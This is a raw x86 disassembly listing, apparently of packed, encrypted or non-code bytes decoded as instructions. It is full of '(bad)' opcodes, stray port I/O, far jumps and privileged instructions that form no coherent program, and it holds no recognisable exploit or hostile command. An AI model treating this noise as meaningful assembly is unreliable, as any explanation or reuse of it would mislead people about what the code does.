  42192e:	cld    
  42192f:	add    DWORD PTR [eax],eax
  421931:	add    BYTE PTR [edx],bl
  421933:	mov    ecx,0xf04489be
  421938:	ja     0x4218c9
  42193a:	xchg   edi,eax
  42193b:	dec    esi
  42193c:	mov    edi,0x2b11b995
  421941:	sub    BYTE PTR [edi+0x19],dh
  421944:	push   0x506fb02f
  421949:	xchg   ebx,eax
  42194a:	mov    eax,0xa13d2b44
  42194f:	repz or ebx,DWORD PTR [ecx-0x5f6cc5b]
  421956:	sub    edx,ecx
  421958:	adc    eax,0x4ed8dc20
  42195d:	push   eax
  42195e:	pop    ebx
  42195f:	xcrypt-ofb (bad)
  421960:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421961:	in     al,dx
  421962:	pusha  
  421963:	and    al,0xdf
  421965:	repnz mov dl,0xb2
  421968:	ret    0x402a
  42196b:	mov    bh,bl
  42196d:	push   0xb2ce536
  421972:	jmp    0xb8d:0x939b5380
  421979:	jecxz  0x421987
  42197b:	out    dx,eax
  42197c:	jne    0x4219de
  42197e:	jb     0x42198c
  421980:	ret    0x38e3
  421983:	mov    esp,DWORD PTR [edx]
  421985:	sub    al,0x9e
  421987:	sub    al,BYTE PTR [edi]
  421989:	sbb    eax,0xcaf7a49a
  42198e:	mov    dl,0xa3
  421990:	rcl    DWORD PTR [edx],0x48
  421993:	stos   BYTE PTR es:[edi],al
  421994:	adc    esi,DWORD PTR [ecx+0x7d]
  421997:	(bad)  
  421998:	add    al,0x1d
  42199a:	hlt    
  42199b:	in     eax,dx
  42199c:	(bad)  
  42199d:	cli    
  42199e:	popa   
  42199f:	fs mov ebp,0xefbbc2d6
  4219a5:	cmp    BYTE PTR [edx-0x5f142139],ah
  4219ab:	(bad)  
  4219ad:	mov    BYTE PTR [ebx-0x2c],dh
  4219b0:	pop    edx
  4219b1:	loop   0x4219b4
  4219b3:	scas   al,BYTE PTR es:[edi]
  4219b4:	mov    dl,0xa5
  4219b6:	jb     0x4219aa
  4219b8:	aas    
  4219b9:	mov    ebp,0x123d35bd
  4219be:	pusha  
  4219bf:	mov    ds:0x4c8a9f8b,al
  4219c4:	fwait
  4219c5:	inc    esi
  4219c6:	(bad)  
  4219c7:	jl     0x42199e
  4219c9:	ds test eax,0xa9a6c219
  4219cf:	fadd   QWORD PTR [eax]
  4219d1:	stc    
  4219d2:	xchg   DWORD PTR [ecx+0x45],edx
  4219d5:	inc    edi
  4219d6:	or     ecx,DWORD PTR [edx-0x60815002]
  4219dc:	out    0x70,al
  4219de:	ja     0x4219d8
  4219e0:	test   eax,0x78e90864
  4219e5:	ret    0xc1e7
  4219e8:	scas   eax,DWORD PTR es:[edi]
  4219e9:	xlat   BYTE PTR ds:[ebx]
  4219ea:	(bad)  
  4219eb:	add    DWORD PTR ds:[ebx],0x3c
  4219ef:	out    dx,al
  4219f0:	jnp    0x421985
  4219f2:	out    dx,eax
  4219f3:	sub    eax,0x4c89176d
  4219f8:	repz cli 
  4219fa:	imul   ebp,esi,0xffffffe9
  4219fd:	sbb    bl,bl
  4219ff:	in     al,dx
  421a00:	jo     0x4219f2
  421a02:	xor    eax,DWORD PTR [ebx+0x38e49dbf]
  421a08:	cmp    eax,0xb5ee5f5d
  421a0d:	sar    DWORD PTR [esi-0x79],0xb
  421a11:	shl    ecx,1
  421a13:	xchg   esp,eax
  421a14:	scas   al,BYTE PTR es:[edi]
  421a15:	lahf   
  421a16:	int    0x74
  421a18:	loop   0x4219e7
  421a1a:	mov    esi,0x7cf0f880
  421a1f:	push   eax
  421a20:	outs   dx,BYTE PTR ds:[esi]
  421a21:	stc    
  421a22:	xchg   dl,ah
  421a24:	ds jae 0x421a8f
  421a27:	scas   al,BYTE PTR es:[edi]
  421a28:	mov    ds:0x80b1b599,eax
  421a2d:	das    
  421a2e:	into   
  421a2f:	jp     0x421a41
  421a31:	shr    DWORD PTR [eax+0x61c4c73c],0x65
  421a38:	loopne 0x421aa6
  421a3a:	jnp    0x421a77
  421a3c:	out    dx,eax
  421a3d:	sar    DWORD PTR [eax+0x5a],0xdb
  421a41:	push   ebx
  421a42:	or     edx,DWORD PTR [edi+0x586e02d3]
  421a48:	mov    ds:0xab78ea09,eax
  421a4d:	jp     0x421aa5
  421a4f:	scas   al,BYTE PTR es:[edi]
  421a50:	xchg   ebx,eax
  421a51:	add    al,0xd2
  421a53:	mov    WORD PTR [edx-0x4a],gs
  421a56:	push   ecx
  421a57:	iret   
  421a58:	loope  0x421a39
  421a5a:	or     dl,BYTE PTR [ebx+0x48faba08]
  421a60:	add    al,BYTE PTR [edx-0x41]
  421a63:	push   es
  421a64:	into   
  421a65:	inc    edi
  421a66:	bound  ebp,QWORD PTR [edi]
  421a68:	xchg   esi,eax
  421a69:	outs   dx,DWORD PTR ds:[esi]
  421a6a:	(bad)
  421a6d:	mov    BYTE PTR [esi-0x3a],cl
  421a70:	xor    dl,bl
  421a72:	stos   DWORD PTR es:[edi],eax
  421a73:	xchg   esi,eax
  421a74:	lea    esp,[edi+eax*4]
  421a77:	mov    WORD PTR [eax],cs
  421a79:	dec    esi
  421a7a:	ins    DWORD PTR es:[edi],dx
  421a7b:	mov    DWORD PTR [eax-0x29],ecx
  421a7e:	mov    ecx,0x39e31b19
  421a83:	loop   0x421acb
  421a85:	sub    BYTE PTR [edx-0x14679e1c],bh
  421a8b:	xchg   BYTE PTR [edx-0x42],bl
  421a8e:	pusha  
  421a8f:	cmc    
  421a90:	adc    bl,BYTE PTR [edx+0x2]
  421a93:	push   ebp
  421a94:	retf   0x5fc0
  421a97:	test   eax,0x41fd9cfd
  421a9c:	adc    al,0x8b
  421a9e:	pop    es
  421a9f:	and    edi,DWORD PTR ds:0x7b93c754
  421aa5:	or     al,0x39
  421aa7:	clc    
  421aa8:	fistp  DWORD PTR [esi+0x2d]
  421aab:	loope  0x421b12
  421aad:	sub    dl,BYTE PTR ds:0xb63bfdf5
  421ab3:	mov    esp,0x2c781609
  421ab8:	pushf  
  421ab9:	cmp    esi,DWORD PTR ss:[eax+ebp*4]
  421abd:	sar    BYTE PTR [eax-0x78],cl
  421ac0:	sbb    eax,0xf2dc6ff3
  421ac5:	out    0x6d,al
  421ac7:	cwde   
  421ac8:	pop    ss
  421ac9:	or     eax,0x632c1b76
  421ace:	dec    ecx
  421acf:	xchg   ebp,eax
  421ad0:	add    esi,esp
  421ad2:	or     eax,0x1dd31c59
  421ad7:	std    
  421ad8:	shl    dh,cl
  421ada:	int    0xff
  421adc:	out    0x6c,eax
  421ade:	jno    0x421aaf
  421ae0:	inc    ebp
  421ae1:	aam    0xfe
  421ae3:	icebp  
  421ae4:	mov    al,0x74
  421ae6:	frstor [edi+ecx*1+0x25]
  421aea:	mov    fs,WORD PTR [ebx+0x42fe2635]
  421af0:	and    eax,0x9fa3994e
  421af5:	les    edi,FWORD PTR [ebp-0x11950d26]
  421afb:	and    eax,0xc7449a43
  421b00:	push   es
  421b01:	inc    edi
  421b02:	push   esp
  421b03:	pushf  
  421b04:	popa   
  421b05:	lods   eax,DWORD PTR ds:[esi]
  421b06:	xor    al,BYTE PTR cs:[esi-0x21]
  421b0a:	fisubr WORD PTR [ecx]
  421b0c:	add    BYTE PTR [edi-0x67],bh
  421b0f:	lds    esi,FWORD PTR [edx-0x68]
  421b12:	aas    
  421b13:	in     eax,0x25
  421b15:	sbb    al,BYTE PTR [edi+0x5fc67135]
  421b1b:	sub    DWORD PTR [edi+edi*2+0x6dc9be85],ebx
  421b22:	add    al,0x2b
  421b24:	mov    DWORD PTR [ebx+0x5a],esi
  421b27:	jns    0x421aaf
  421b29:	adc    al,0xcc
  421b2b:	push   edx
  421b2c:	xchg   ecx,eax
  421b2d:	fadd   QWORD PTR [eax]
	...
  421b37:	add    BYTE PTR [eax],al
  421b39:	add    BYTE PTR [ecx-0x6b36a2],ch
  421b3f:	xchg   edi,eax
  421b40:	std    
  421b41:	jg     0x421b32
  421b43:	mov    edi,0xb08ff8f7
  421b48:	je     0x421b09
  421b4a:	loopne 0x421ae2
  421b4c:	add    DWORD PTR [eax],eax
  421b4e:	cld    
  421b4f:	add    DWORD PTR [eax],eax
  421b51:	add    BYTE PTR [ebp+0x793a65d3],ah
  421b57:	js     0x421b36
  421b59:	and    al,0x14
  421b5b:	or     bl,BYTE PTR [edx+0x5913fe0e]
  421b61:	adc    esi,DWORD PTR [edx]
  421b63:	jmp    0xa987cac7
  421b68:	xor    al,0x33
  421b6a:	mov    bh,BYTE PTR [ecx+esi*2-0x6d]
  421b6e:	sub    BYTE PTR [ebx+edx*1-0x4a],ah
  421b72:	mov    ch,0x80
  421b74:	cmp    DWORD PTR [ecx+0x5f95b0b0],0xfffffff0
  421b7b:	jl     0x421b25
  421b7d:	push   edx
  421b7e:	pop    ss
  421b7f:	or     al,0xb7
  421b81:	xchg   edx,eax
  421b82:	cmp    eax,0x9e547c
  421b87:	je     0x421c08
  421b89:	nop
  421b8a:	imul   ebx,DWORD PTR [edx-0x29],0x11
  421b8e:	(bad)  
  421b8f:	in     al,dx
  421b90:	push   ecx
  421b91:	jl     0x421bb5
  421b93:	repnz mov cl,0xa5
  421b96:	imul   DWORD PTR fs:[edi]
  421b99:	pop    DWORD PTR [edx]
  421b9b:	clc    
  421b9c:	sub    edi,DWORD PTR [ebx-0x35a5d2a9]
  421ba2:	dec    edi
  421ba3:	xor    eax,0x493c368d
  421ba8:	arpl   WORD PTR [esi-0xb93de7b],si
  421bae:	mov    BYTE PTR [edx+0x2eb27464],dh
  421bb4:	pop    ebx
  421bb5:	dec    ebp
  421bb6:	test   BYTE PTR [ebx+0x71070492],bl
  421bbc:	push   ss
  421bbd:	sub    eax,0xee82718
  421bc2:	inc    esp
  421bc3:	pop    ebx
  421bc4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421bc5:	push   edi
  421bc6:	jnp    0x421c1c
  421bc8:	shr    ecx,1
  421bca:	mov    ch,BYTE PTR ds:0x8392fe9c
  421bd0:	nop
  421bd1:	cmp    bl,BYTE PTR [eax-0x42e5f68a]
  421bd7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421bd8:	retfw  
  421bda:	ja     0x421bd3
  421bdc:	mov    ah,0x64
  421bde:	ror    DWORD PTR [ecx],1
  421be0:	daa    
  421be1:	dec    esi
  421be2:	gs add ebx,esi
  421be5:	sub    BYTE PTR [eax+ebx*2-0x1],dl
  421be9:	fld    DWORD PTR [esi]
  421beb:	mov    WORD PTR [ebx+0x5a],fs
  421bee:	test   BYTE PTR ds:0x244b1d93,cl
  421bf4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421bf5:	lahf   
  421bf6:	jnp    0x421c5f
  421bf8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421bf9:	sbb    DWORD PTR [esi-0x69],ecx
  421bfc:	setne  BYTE PTR [eax-0x3c08da63]
  421c03:	mov    al,BYTE PTR [edx]
  421c05:	in     al,dx
  421c06:	(bad)  
  421c07:	xor    al,0x7b
  421c09:	cmp    al,0xde
  421c0b:	xor    eax,0xe872f7ad
  421c10:	jp     0x421c55
  421c12:	(bad)  [edx]
  421c14:	mov    ebx,0xfec902de
  421c19:	pop    eax
  421c1a:	cmp    al,0x5f
  421c1c:	xchg   esp,eax
  421c1d:	pop    ecx
  421c1e:	outs   dx,DWORD PTR ds:[esi]
  421c1f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421c20:	mov    ds,eax
  421c22:	adc    BYTE PTR [esp+ebx*1-0x47],dh
  421c26:	pop    edx
  421c27:	(bad)  [edi]
  421c29:	inc    ax
  421c2b:	or     eax,DWORD PTR [edx]
  421c2d:	mov    eax,0x667a3797
  421c33:	popf   
  421c34:	mov    ds:0x219e1d43,eax
  421c39:	push   esp
  421c3a:	add    BYTE PTR [ebp+esi*1+0x5a],bh
  421c3e:	call   FWORD PTR ds:0x293f9726
  421c44:	pop    ds
  421c45:	dec    edi
  421c46:	jp     0x421ca5
  421c48:	test   BYTE PTR [ecx-0x10],ch
  421c4b:	jl     0x421c4f
  421c4d:	in     al,0x4e
  421c4f:	test   edx,edx
  421c51:	aam    0x56
  421c53:	dec    ebx
  421c54:	add    eax,0xd9cd0716
  421c59:	adc    al,BYTE PTR cs:[ebx+eax*4]
  421c5d:	xchg   DWORD PTR [edi+0x3a72deb8],esi
  421c63:	push   eax
  421c64:	or     edx,DWORD PTR [ecx+ebx*8]
  421c67:	scas   al,BYTE PTR es:[edi]
  421c68:	xor    ecx,eax
  421c6a:	add    cl,bl
  421c6c:	jge    0x421c30
  421c6e:	std    
  421c6f:	sbb    al,0x60
  421c71:	push   esi
  421c72:	dec    edi
  421c73:	repnz cmp BYTE PTR [ecx+edi*8],cl
  421c77:	sbb    DWORD PTR [ebx-0x2a21cf9f],ebp
  421c7d:	sbb    eax,0xe00049eb
  421c82:	in     eax,0x6a
  421c84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421c85:	out    0x45,eax
  421c87:	dec    esi
  421c88:	ror    DWORD PTR [ebx+0x494adcb],1
  421c8e:	out    dx,al
  421c8f:	in     eax,dx
  421c90:	pusha  
  421c91:	fwait
  421c92:	div    DWORD PTR [ebx+0x5ce9f145]
  421c98:	fsub   QWORD PTR [ebp+edi*1+0x44a8575c]
  421c9f:	inc    edi
  421ca0:	xchg   esp,eax
  421ca1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421ca2:	div    BYTE PTR [eax]
  421ca4:	dec    edx
  421ca5:	xor    edx,DWORD PTR [ebp+0x30]
  421ca8:	pop    esi
  421ca9:	test   eax,0xd82cbf65
  421cae:	sbb    eax,0x3bd0b603
  421cb3:	and    ebp,DWORD PTR [eax-0x1e]
  421cb6:	dec    ecx
  421cb7:	sbb    eax,0x1dfcad68
  421cbc:	pop    ebp
  421cbd:	std    
  421cbe:	and    BYTE PTR [esi-0x67],0x47
  421cc2:	push   edi
  421cc3:	js     0x421c4b
  421cc5:	cmp    eax,0xfb7e6749
  421cca:	(bad)  
  421ccb:	mov    eax,0xf5d820a5
  421cd0:	jnp    0x421c90
  421cd2:	mov    ebp,0x21d81a1b
  421cd7:	f2xm1  
  421cd9:	fstp   st(7)
  421cdb:	mov    ?,eax
  421cdd:	js     0x421c63
  421cdf:	inc    esi
  421ce0:	push   ss
  421ce1:	or     BYTE PTR [ecx+0x14712ad],bl
  421ce7:	je     0x421d4d
  421ce9:	and    cl,dl
  421ceb:	aas    
  421cec:	stc    
  421ced:	or     cl,ah
  421cef:	mov    esi,0x388c3ddd
  421cf4:	mov    ah,0xe
  421cf6:	std    
  421cf7:	rol    BYTE PTR [edi],0xbc
  421cfa:	arpl   sp,dx
  421cfc:	clc    
  421cfd:	mov    al,ds:0x8c96cff9
  421d02:	(bad)  
  421d03:	dec    ebp
  421d04:	arpl   WORD PTR [esi],bp
  421d06:	icebp  
  421d07:	pop    edi
  421d08:	pop    ecx
  421d09:	icebp  
  421d0a:	shl    BYTE PTR [edx+ecx*8],cl
  421d0d:	enter  0xab08,0x88
  421d11:	inc    esp
  421d12:	add    al,0x88
  421d14:	in     eax,dx
  421d15:	pop    eax
  421d16:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421d17:	cmp    al,0xaa
  421d19:	lods   al,BYTE PTR ds:[esi]
  421d1a:	iret   
  421d1b:	xchg   esi,eax
  421d1c:	cs aas 
  421d1e:	and    edi,ecx
  421d20:	popa   
  421d21:	push   ds
  421d22:	jns    0x421d90
  421d24:	adc    al,0x90
  421d26:	and    ch,BYTE PTR [eax]
  421d28:	ja     0x421d3e
  421d2a:	pop    ebx
  421d2b:	dec    edx
  421d2c:	and    DWORD PTR [eax+edx*1-0x23cd32a3],eax
  421d33:	stc    
  421d34:	call   0xa3c1:0xb0a39198
  421d3b:	fcomp  DWORD PTR [esi]
  421d3d:	inc    ebp
  421d3e:	das    
  421d3f:	(bad)  
  421d41:	bound  edx,QWORD PTR [ecx+0x5d18c68d]
  421d47:	not    BYTE PTR [edx]
  421d49:	aaa    
  421d4a:	inc    ecx
  421d4b:	pop    edi
  421d4c:	sbb    edi,DWORD PTR [edi+0x0]
	...
  421d5a:	mov    ebx,0x7d7539cf
  421d5f:	idiv   edi
  421d61:	iret   
  421d62:	(bad)  
  421d63:	ror    DWORD PTR [ebp+0x6d],1
  421d66:	jp     0x421cf5
  421d68:	sbb    eax,0x198dccf
  421d6d:	add    ah,bh
  421d6f:	add    DWORD PTR [eax],eax
  421d71:	add    BYTE PTR [ecx],cl
  421d73:	ds daa 
  421d75:	mov    fs,WORD PTR [ebp-0x67]
  421d78:	cmp    al,0x2
  421d7a:	scas   eax,DWORD PTR es:[edi]
  421d7b:	hlt    
  421d7c:	and    eax,0xfa05c22a
  421d81:	mov    edi,DWORD PTR [edi+0x58fa206a]
  421d87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421d88:	cmp    eax,DWORD PTR [eax-0x34]
  421d8b:	mov    ecx,0x7fd527c7
  421d90:	inc    edi
  421d91:	ins    DWORD PTR es:[edi],dx
  421d92:	mov    cl,al
  421d94:	fwait
  421d95:	mov    eax,0xc3817e0b
  421d9a:	shl    BYTE PTR [ecx+ecx*4-0x13],cl
  421d9e:	push   0x5bea516f
  421da3:	sub    BYTE PTR [edi+0x3584790f],ah
  421da9:	enter  0x3b9e,0x1d
  421dad:	cdq    
  421dae:	aas    
  421daf:	ins    BYTE PTR es:[edi],dx
  421db0:	mov    bl,0x8
  421db2:	xor    DWORD PTR [esi+0x63],0x6ea1c818
  421db9:	pop    edi
  421dba:	and    BYTE PTR [eax+0x66355205],cl
  421dc0:	mov    edi,0xfcd0ab4a
  421dc5:	adc    al,0x62
  421dc7:	pop    ebp
  421dc8:	sar    DWORD PTR [eax],0xcd
  421dcb:	mov    DWORD PTR [ebp+0x55],ebp
  421dce:	cwde   
  421dcf:	xchg   edx,eax
  421dd0:	test   al,0xd
  421dd2:	and    al,0x5e
  421dd4:	fwait
  421dd5:	pop    ss
  421dd6:	or     ecx,DWORD PTR [edi]
  421dd8:	lea    ebp,[ebp-0x41b2d32a]
  421dde:	aaa    
  421ddf:	test   DWORD PTR [ecx-0x782ae24a],0xff93be46
  421de9:	ins    DWORD PTR es:[edi],dx
  421dea:	shl    cl,1
  421dec:	repz ret 
  421dee:	dec    esp
  421def:	sbb    esp,DWORD PTR [edi]
  421df1:	mov    ebp,0xf228f974
  421df6:	mov    eax,ds:0x5d70f45f
  421dfb:	xchg   esi,eax
  421dfc:	adc    al,0x3b
  421dfe:	mov    dh,0x5d
  421e00:	xchg   edi,eax
  421e01:	jns    0x421e40
  421e03:	ins    DWORD PTR es:[edi],dx
  421e04:	and    BYTE PTR [esp+eax*1],bl
  421e07:	rcl    DWORD PTR [ebx+0x3f673e48],0xbc
  421e0e:	xor    edi,edi
  421e10:	out    0x77,al
  421e12:	cmp    sp,bx
  421e15:	sbb    ah,bl
  421e17:	sub    edx,DWORD PTR [eax+ebp*8+0x62c0894d]
  421e1e:	sbb    ebp,DWORD PTR [ecx-0x2c933679]
  421e24:	call   0x1076:0xd93b30c9
  421e2b:	cmp    BYTE PTR [ebp+0x10c39955],dl
  421e31:	shl    BYTE PTR [ebp+0x365fee98],cl
  421e37:	cwde   
  421e38:	repz sub al,BYTE PTR [ecx+eiz*8-0x11]
  421e3d:	stc    
  421e3e:	sti    
  421e3f:	pop    eax
  421e40:	fmul   QWORD PTR [ecx-0xf]
  421e43:	add    esi,ebx
  421e45:	je     0x421ebe
  421e47:	aaa    
  421e48:	popa   
  421e49:	jb     0x421e18
  421e4b:	scas   al,BYTE PTR es:[edi]
  421e4c:	mov    bh,0xac
  421e4e:	mov    WORD PTR [edx],gs
  421e50:	or     cl,ch
  421e52:	mov    esp,0x51d6fc77
  421e57:	hlt    
  421e58:	les    ebx,FWORD PTR [ecx]
  421e5a:	into   
  421e5b:	mov    edx,0xaceff74
  421e60:	retf   0x1b01
  421e63:	cdq    
  421e64:	lahf   
  421e65:	dec    edi
  421e66:	xor    eax,0x73474c8a
  421e6b:	add    eax,0xa615f446
  421e70:	paddsw mm5,QWORD PTR [eax+0xf717a70]
  421e77:	call   0x2fb8998
  421e7c:	pop    es
  421e7d:	push   edx
  421e7e:	inc    ebp
  421e7f:	pushf  
  421e80:	push   ecx
  421e81:	hlt    
  421e82:	add    esp,esi
  421e84:	cmp    al,0x2f
  421e86:	pop    ebp
  421e87:	cmovp  esp,DWORD PTR [ebx+edx*8+0xc660a70]
  421e8f:	xor    BYTE PTR [edx],bl
  421e91:	cld    
  421e92:	ins    BYTE PTR es:[edi],dx
  421e93:	adc    bl,BYTE PTR [esi-0x7a2b52ee]
  421e99:	cmp    BYTE PTR ds:0x3b627af9,dl
  421e9f:	out    dx,al
  421ea0:	les    eax,FWORD PTR [ecx-0x24dd7d10]
  421ea6:	jo     0x421edd
  421ea8:	push   ss
  421ea9:	sbb    DWORD PTR [edx],esi
  421eab:	in     eax,0x39
  421ead:	mov    esi,0x1f5dfbfe
  421eb2:	gs lock (bad) 
  421eb5:	mov    bh,0xb8
  421eb7:	sub    BYTE PTR [ebx-0x5a],cl
  421eba:	sbb    al,0x83
  421ebc:	leave  
  421ebd:	sbb    eax,0x9040603b
  421ec2:	aaa    
  421ec3:	cwde   
  421ec4:	adc    ebx,DWORD PTR [edx-0x45]
  421ec7:	adc    DWORD PTR [ecx+ebx*4+0x42],esi
  421ecb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421ecc:	lock push edi
  421ece:	stc    
  421ecf:	xchg   esi,eax
  421ed0:	inc    ebp
  421ed1:	mov    ecx,0x9630d96d
  421ed6:	xchg   ecx,eax
  421ed7:	dec    ebp
  421ed8:	add    ah,BYTE PTR [esi-0x7ba105a6]
  421ede:	mov    cl,BYTE PTR [eax-0x14]
  421ee1:	imul   al
  421ee3:	mov    ds:0x5d388ca,eax
  421ee8:	sub    DWORD PTR [ebp+0x5d6c4f58],esp
  421eee:	ror    eax,0xf9
  421ef1:	or     ch,BYTE PTR [esp+ebp*1-0x1]
  421ef5:	les    ebp,FWORD PTR [eax-0x8a8dbff]
  421efb:	adc    DWORD PTR [eax],edx
  421efd:	pop    edx
  421efe:	addr16 mov al,ds:0x96de
  421f02:	fldenv ds:0xac893d65
  421f08:	ins    DWORD PTR es:[edi],dx
  421f09:	fnsave [esp+eax*1-0x4cb00388]
  421f10:	add    BYTE PTR [esi],al
  421f12:	outs   dx,BYTE PTR ds:[esi]
  421f13:	cmp    edi,DWORD PTR [eax-0x5e83904c]
  421f19:	xchg   edi,eax
  421f1a:	adc    DWORD PTR [edx-0x31560042],0xffffffab
  421f21:	loope  0x421f73
  421f23:	xchg   BYTE PTR [edi+ebp*2],dh
  421f26:	jmp    0xb820:0x55df5be8
  421f2d:	push   0xffffff82
  421f2f:	mov    WORD PTR [esi-0x57fdf07a],fs
  421f35:	sti    
  421f36:	xchg   esp,eax
  421f37:	cmp    BYTE PTR [ecx-0x75],bh
  421f3a:	es popf 
  421f3c:	mov    ds:0xc8ab8490,eax
  421f41:	(bad)
  421f44:	mov    edx,0x5b789437
  421f49:	test   esi,esp
  421f4b:	clc    
  421f4c:	xor    BYTE PTR [edx-0x333ed418],ah
  421f52:	in     eax,0xbe
  421f54:	pop    ds
  421f55:	push   0x8078e026
  421f5a:	ins    DWORD PTR es:[edi],dx
  421f5b:	int    0xf
  421f5d:	shr    cl,1
  421f5f:	sub    BYTE PTR [ecx+0x69],cl
  421f62:	jge    0x421f35
  421f64:	cmp    al,ch
  421f66:	test   eax,0xe3ea84cd
  421f6b:	mov    edx,DWORD PTR [ebx+ebp*8]
	...
  421f7a:	out    dx,al
  421f7b:	ret    0x2d9d
  421f7e:	mov    ebp,0x33c3fe7f
  421f83:	ja     0x421f4e
  421f85:	or     BYTE PTR [eax+edi*1-0x6527ec21],dl
  421f8c:	add    DWORD PTR [eax],eax
  421f8e:	cld    
  421f8f:	add    DWORD PTR [eax],eax
  421f91:	add    BYTE PTR [edi-0x6ee0ac53],dl
  421f97:	mov    bl,0xcb
  421f99:	pop    esp
  421f9a:	and    dl,BYTE PTR [edi-0x7802eb5f]
  421fa0:	(bad)  
  421fa1:	cmp    esp,DWORD PTR [esi-0x335c535]
  421fa7:	mov    BYTE PTR [edi+ebx*1-0x418626d9],bl
  421fae:	or     edi,edi
  421fb0:	jbe    0x421f87
  421fb2:	popf   
  421fb3:	ret    
  421fb4:	(bad)  
  421fb5:	fiadd  DWORD PTR [edi-0x1a]
  421fb8:	outs   dx,BYTE PTR ds:[esi]
  421fb9:	add    al,dl
  421fbb:	std    
  421fbc:	pop    ebx
  421fbd:	mov    ebp,0xe48589fc
  421fc2:	push   esi
  421fc3:	push   0x10
  421fc5:	cmova  eax,eax
  421fc8:	mov    ah,0xc3
  421fca:	jp     0x421f55
  421fcc:	icebp  
  421fcd:	cmc    
  421fce:	and    dh,ah
  421fd0:	jb     0x421fa3
  421fd2:	cmp    BYTE PTR [edx],dh
  421fd4:	sar    eax,0xe5
  421fd7:	scas   eax,DWORD PTR es:[edi]
  421fd8:	or     bh,BYTE PTR [esi-0xf]
  421fdb:	hlt    
  421fdc:	mov    al,ds:0x1f743dd0
  421fe1:	imul   ebx,DWORD PTR [ecx+0x16],0x50
  421fe5:	les    esp,FWORD PTR [eax]
  421fe7:	pop    es
  421fe8:	idiv   DWORD PTR [ecx+0x9]
  421feb:	lods   eax,DWORD PTR ds:[esi]
  421fec:	fucom  st(5)
  421fee:	je     0x42200f
  421ff0:	xor    al,BYTE PTR [esi+0x1d]
  421ff3:	adc    DWORD PTR [ebx+0x1368d83f],0x23d3cfa3
  421ffd:	jnp    0x421fc7
  421fff:	mov    edx,0xd39432f2
  422004:	pop    edx
  422005:	adc    edi,ecx
  422007:	stc    
  422008:	es mov esp,0xf212c623
  42200e:	push   ds
  42200f:	icebp  
  422010:	loop   0x422017
  422012:	or     DWORD PTR [eax+0x4c],ecx
  422015:	loope  0x422004
  422017:	into   
  422018:	sub    esi,eax
  42201a:	sub    ch,dh
  42201c:	mov    cl,bh
  42201e:	sbb    DWORD PTR [eax],ecx
  422020:	sub    ah,bl
  422022:	dec    ebp
  422023:	jae    0x42202a
  422025:	push   ss
  422026:	enter  0xe4a8,0xdd
  42202a:	sub    BYTE PTR [ebx+edx*4-0x186a097e],ah
  422031:	fisub  WORD PTR [edx+0x46f085e2]
  422037:	stos   DWORD PTR es:[edi],eax
  422038:	xchg   esp,ecx
  42203a:	iret   
  42203b:	cmp    BYTE PTR [ebx],0x82
  42203e:	dec    edx
  42203f:	shr    eax,0x50
  422042:	loope  0x422017
  422044:	or     ch,BYTE PTR [edi]
  422046:	cmp    eax,ecx
  422048:	enter  0xabe7,0x6f
  42204c:	sub    DWORD PTR [ecx],ebx
  42204e:	mov    cl,0x63
  422050:	ss js  0x42207d
  422053:	out    dx,eax
  422054:	inc    eax
  422055:	mov    ah,0x98
  422057:	popa   
  422058:	xchg   esp,eax
  422059:	lds    edx,FWORD PTR [ebx]
  42205b:	xor    DWORD PTR [ebx+ebp*4],esp
  42205e:	enter  0xcbb3,0xad
  422062:	stc    
  422063:	imul   cx,dx,0x5a
  422067:	push   ebx
  422068:	pop    es
  422069:	pusha  
  42206a:	ds xchg ecx,eax
  42206c:	push   0x28
  42206e:	sub    BYTE PTR [eax-0x57],cl
  422071:	leave  
  422072:	sar    dl,0xe0
  422075:	adc    bh,BYTE PTR [edx-0x20]
  422078:	loopne 0x422022
  42207a:	inc    ebx
  42207b:	stc    
  42207c:	scas   eax,DWORD PTR es:[edi]
  42207d:	icebp  
  42207e:	adc    ah,BYTE PTR [eax+0x5cd6adc3]
  422084:	test   BYTE PTR [esi+0x64],al
  422087:	test   eax,0x52754f01
  42208c:	arpl   WORD PTR [edi+ebp*4+0x6d408e3a],cx
  422093:	es enter 0x940c,0x6a
  422098:	es xchg esi,eax
  42209a:	retf   0x7341
  42209d:	test   eax,0xbc5fd151
  4220a2:	cmp    BYTE PTR [edi-0x36],bh
  4220a5:	cmp    DWORD PTR [esi],edx
  4220a7:	rcl    bl,1
  4220a9:	fisttp WORD PTR [esi-0x5b]
  4220ac:	add    edx,esi
  4220ae:	pop    ss
  4220af:	sbb    eax,0x14c1e0ac
  4220b4:	cmp    eax,0x9bccb08b
  4220b9:	in     eax,0xd2
  4220bb:	jb     0x422054
  4220bd:	test   DWORD PTR [esi+0x537c43d0],0xaaadb530
  4220c7:	dec    ebx
  4220c8:	call   0x9fb2:0x4d2b9cdf
  4220cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4220d0:	jns    0x4220e4
  4220d2:	cmp    DWORD PTR [esi-0x40],ecx
  4220d5:	test   esi,esi
  4220d7:	dec    ebx
  4220d8:	test   BYTE PTR [eax+ebp*1-0x6e301cac],ch
  4220df:	mov    di,0xb8c9
  4220e3:	push   cs
  4220e4:	es mov dh,0x59
  4220e7:	(bad)  
  4220e8:	in     al,0x35
  4220ea:	xchg   edx,eax
  4220eb:	cmp    ebp,DWORD PTR [ebx+0x5d]
  4220ee:	mov    bh,0x5e
  4220f0:	scas   eax,DWORD PTR es:[edi]
  4220f1:	dec    edx
  4220f2:	mov    cl,0x17
  4220f4:	mov    al,0x77
  4220f6:	or     eax,0x968f231
  4220fb:	adc    eax,0x352b3a05
  422100:	in     al,dx
  422101:	dec    edi
  422102:	sahf   
  422103:	lock jnp 0x422153
  422106:	dec    edx
  422107:	jmp    0x1582:0x7a967286
  42210e:	fisub  WORD PTR ss:[edx+ebp*1+0x55a24e4c]
  422116:	add    dh,BYTE PTR [ebx+0x29de757]
  42211c:	cwde   
  42211d:	mov    edx,0x1d04cb99
